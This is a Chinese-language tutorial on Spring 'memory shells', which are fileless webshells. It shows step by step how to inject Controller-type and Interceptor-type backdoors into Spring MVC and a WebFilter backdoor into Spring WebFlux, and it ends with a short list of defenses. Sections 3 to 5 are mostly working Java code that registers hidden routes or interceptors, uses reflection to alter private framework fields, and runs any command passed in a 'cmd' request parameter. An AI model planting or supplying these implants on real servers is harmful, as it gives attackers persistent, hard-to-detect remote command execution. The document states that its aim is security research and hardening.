1. 引言

内存马（Memory Shell）是一种无文件落地的Webshell技术，其核心在于将恶意代码注入到运行中的Web应用程序内存中，不依赖磁盘文件，从而绕过传统文件扫描和完整性校验。在Java生态中，Spring框架凭借其灵活性和广泛使用，成为内存马技术的重要目标。本文将以Spring MVC和Spring Webflux为例，深入剖析Controller型和Interceptor型内存马的实现原理，并手把手演示动态注册的代码实现，帮助读者理解其攻击手法与防御思路。

2. Spring MVC内存马概述

Spring MVC的核心组件是DispatcherServlet，它负责将请求分发给合适的处理器（Handler）。处理器可以是@Controller注解的方法（即Controller类型），也可以是HandlerInterceptor（拦截器）。两者分别对应两种常见的内存马植入点：

· Controller型内存马：动态注册一个新的@RequestMapping方法，映射到恶意路径，执行命令。
· Interceptor型内存马：向拦截器链中添加一个自定义的HandlerInterceptor，在preHandle方法中执行恶意代码。

无论是哪种方式，都需要获取Spring的WebApplicationContext，并利用内部的注册机制完成动态注入。

3. Controller型内存马

3.1 理论背景

在Spring MVC中，请求映射由RequestMappingHandlerMapping维护。该类负责将@RequestMapping信息与对应的处理器方法（HandlerMethod）关联起来。通常，这些映射在应用启动时通过扫描@Controller和@RequestMapping完成注册。但RequestMappingHandlerMapping提供了一个公共方法registerMapping，允许在运行时动态添加新的映射关系。

registerMapping方法签名如下：

```java
public void registerMapping(RequestMappingInfo mapping, Object handler, Method method)
```

· mapping：请求映射信息，包括URL路径、HTTP方法等。
· handler：处理请求的对象实例，通常是一个Controller类的实例。
· method：处理器对象中实际处理请求的方法。

因此，我们可以构造一个自定义的Controller类（包含恶意方法），创建对应的RequestMappingInfo，然后调用registerMapping将其注入内存。

3.2 动态注册实现

首先，构造一个恶意的Controller类，包含一个shell方法，该方法接收HttpServletRequest和HttpServletResponse，并执行传入的cmd参数：

```java
public class ControllerShell {
    public void shell(HttpServletRequest request, HttpServletResponse response) throws Exception {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            Runtime.getRuntime().exec(cmd);
            response.getWriter().println("Executed: " + cmd);
        }
    }
}
```

接下来，通过请求触发注册逻辑。我们需要一个入口（例如/inject）来执行动态注册：

```java
@RestController
public class InjectController {
    @RequestMapping("/inject")
    public String inject() throws Exception {
        // 1. 获取当前WebApplicationContext
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder
                .currentRequestAttributes()
                .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        // 2. 从容器中获取RequestMappingHandlerMapping Bean
        RequestMappingHandlerMapping mappingHandler = context.getBean(RequestMappingHandlerMapping.class);

        // 3. 通过反射获取ControllerShell中的shell方法
        Method method = ControllerShell.class.getDeclaredMethod("shell", HttpServletRequest.class, HttpServletResponse.class);

        // 4. 构造请求映射信息，路径为 /shell
        PatternsRequestCondition url = new PatternsRequestCondition("/shell");
        RequestMethodsRequestCondition methods = new RequestMethodsRequestCondition(); // 允许所有HTTP方法
        RequestMappingInfo info = new RequestMappingInfo(url, methods, null, null, null, null, null);

        // 5. 动态注册
        mappingHandler.registerMapping(info, new ControllerShell(), method);

        return "Controller Shell injected successfully!";
    }
}
```

关键步骤说明：

· 获取上下文：通过RequestContextHolder.currentRequestAttributes()可以拿到当前请求的属性，其中包含DispatcherServlet持有的WebApplicationContext。属性名是固定的，直接使用即可。
· 获取RequestMappingHandlerMapping：从Spring容器中获取该Bean，因为它是管理映射的核心组件。
· 反射获取方法：注意方法参数必须与registerMapping期望的一致，否则调用时会抛出异常。
· 构造RequestMappingInfo：可以设置URL、HTTP方法、参数、请求头等条件。此处仅设置URL，表示任何方法都可以访问。
· 注册：registerMapping将映射关系加入内存。此后，任何访问/shell的请求都会被路由到ControllerShell.shell方法。

3.3 断点调试验证

为了理解Spring MVC如何处理动态注册，可以在RequestMappingHandlerMapping.registerMapping处设置断点。跟踪调用栈，可以发现它最终将RequestMappingInfo和HandlerMethod存入一个MappingRegistry（内部类）中。后续请求到达时，DispatcherServlet通过getHandler遍历所有映射，匹配成功后执行对应方法。通过调试，可以清晰看到动态添加的映射与原有映射共存。

4. Interceptor型内存马

4.1 理论背景

拦截器（Interceptor）是Spring MVC提供的另一种请求拦截机制，通过实现HandlerInterceptor接口，可以在处理器执行前、后及视图渲染后插入自定义逻辑。所有的拦截器被保存在AbstractHandlerMapping的adaptedInterceptors字段中（一个List<HandlerInterceptor>）。请求处理时，DispatcherServlet通过HandlerExecutionChain依次执行这些拦截器的preHandle、postHandle等方法。

因此，如果我们能获取到adaptedInterceptors列表，并向其中添加一个恶意的拦截器，即可实现内存马。

4.2 动态注册实现

同样需要一个入口方法，例如/injectInterceptor。代码如下：

```java
@RestController
public class InterceptorInjectController {

    @RequestMapping("/injectInterceptor")
    public String injectInterceptor() throws Exception {
        // 获取上下文
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder
                .currentRequestAttributes()
                .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        // 获取RequestMappingHandlerMapping（它也继承自AbstractHandlerMapping）
        RequestMappingHandlerMapping mappingHandler = context.getBean(RequestMappingHandlerMapping.class);

        // 反射获取adaptedInterceptors字段
        Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        List<HandlerInterceptor> interceptors = (List<HandlerInterceptor>) field.get(mappingHandler);

        // 添加自定义拦截器
        interceptors.add(new TestInterceptor());

        return "Interceptor injected!";
    }

    // 恶意拦截器
    public static class TestInterceptor implements HandlerInterceptor {
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                Runtime.getRuntime().exec(cmd);
            }
            return true; // 继续执行后续拦截器和处理器
        }
    }
}
```

核心逻辑：

· 获取RequestMappingHandlerMapping对象（它继承自AbstractHandlerMapping）。
· 通过反射访问AbstractHandlerMapping的私有字段adaptedInterceptors，该字段存储了所有拦截器。
· 将自定义的TestInterceptor实例添加到该列表。由于拦截器列表是List类型，直接add即可。
· 注意：TestInterceptor的preHandle方法中，我们获取cmd参数并执行命令，同时返回true，保证请求流程正常继续（避免影响原有业务）。

4.3 持久性与作用域

动态添加的拦截器会一直存在于内存中，直到应用重启。但需要注意的是，如果adaptedInterceptors列表是某个AbstractHandlerMapping实例持有的，那么该实例必须是单例且全局的。RequestMappingHandlerMapping默认是单例，因此添加的拦截器对全局生效。

5. Spring Webflux型内存马

Spring Webflux是基于Reactive编程模型的Web框架，其核心组件不再是DispatcherServlet，而是DispatcherHandler。在Webflux中，过滤器（WebFilter）扮演了与拦截器类似的角色，可以对请求进行前置/后置处理。动态注册WebFilter的原理与拦截器类似，但涉及的类有所不同。

5.1 理论简述

DispatcherHandler在处理请求时，会通过WebFilterChain依次执行所有注册的WebFilter。这些过滤器通常存储在DispatcherHandler的filters字段中（类型为List<WebFilter>）。因此，获取DispatcherHandler实例后，通过反射修改其filters列表，添加自定义的恶意WebFilter即可实现内存马。

5.2 实现思路（示例）

由于代码与Spring MVC类似，仅列出关键步骤：

```java
// 获取上下文（Webflux中为ReactiveWebApplicationContext）
ReactiveWebApplicationContext context = ...; // 可通过类似方式获取

// 获取DispatcherHandler Bean
DispatcherHandler dispatcherHandler = context.getBean(DispatcherHandler.class);

// 反射获取filters字段
Field field = DispatcherHandler.class.getDeclaredField("filters");
field.setAccessible(true);
List<WebFilter> filters = (List<WebFilter>) field.get(dispatcherHandler);

// 添加恶意WebFilter
filters.add(new MyWebFilter());

// 自定义WebFilter
public class MyWebFilter implements WebFilter {
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        String cmd = exchange.getRequest().getQueryParams().getFirst("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (Exception e) {}
        }
        return chain.filter(exchange);
    }
}
```

需要注意的是，Webflux采用异步非阻塞模型，但执行命令的代码仍是阻塞的，可能对性能有影响，但作为内存马已经足够。

6. 防御措施

内存马隐蔽性强，传统的文件扫描无法发现，因此需要从行为检测和架构层面进行防御：

1. 限制反射操作：通过Java SecurityManager或自定义SecurityManager，限制对关键类（如AbstractHandlerMapping、DispatcherHandler）的反射访问。
2. 监控关键Bean的变更：定期检查RequestMappingHandlerMapping中的映射数量、拦截器列表、过滤器列表，与基线对比，发现异常及时告警。
3. 应用自身加固：避免在业务代码中提供动态注册接口（如示例中的/inject），除非必要且经过严格鉴权。
4. RASP（Runtime Application Self-Protection）：使用RASP工具在运行时检测敏感操作，如Runtime.exec、反射修改关键字段等行为。
5. 权限控制：确保应用以最小权限运行，即使被植入内存马，也能限制其破坏能力。

7. 结语

本文从理论和实践两个角度详细分析了Spring框架下的内存马技术，涵盖了Controller型、Interceptor型以及Webflux型的动态注册原理与实现。理解这些技术不仅有助于安全研究人员进行攻防演练，也能帮助开发人员更好地加固自己的应用。内存马作为高级持续性威胁的一种手段，其防御需要结合多种策略，从代码层面到运行时监控，构建纵深防御体系。希望本文能为读者提供有价值的参考。
